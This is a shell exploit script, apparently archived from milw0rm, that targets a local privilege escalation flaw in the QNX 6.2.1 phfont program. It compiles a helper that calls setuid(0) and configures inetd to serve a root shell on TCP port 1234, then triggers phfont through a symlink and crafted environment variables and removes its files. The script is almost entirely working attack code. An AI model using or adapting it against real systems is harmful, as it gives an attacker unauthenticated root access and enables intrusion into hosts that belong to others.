#!/bin/sh
# word, exploit for http://www.idefense.com/intelligence/vulnerabilities/display.php?id=383
# greetings and salutations from www.lort.dk
# kokanin@dtors 18/10/2003
# $ cksum /usr/photon/bin/phfont
# 4123428723      30896 /usr/photon/bin/phfont
# $ uname -a
# QNX localhost 6.2.1 2003/01/08-14:50:46est x86pc x86 
cat > phfontphf.c << __EOF__
int main(){
setuid(0);
system("echo 1234 stream tcp nowait root  /bin/sh       sh -i>/tmp/dsr && /usr/sbin/inetd /tmp/dsr");
} 
__EOF__
make phfontphf >/dev/null
ln -s /usr/photon/bin/phfont ./phfont
export PHFONT=hello
export PHOTON2_PATH=mom
./phfont
rm phfont*

# milw0rm.com [2006-02-08]
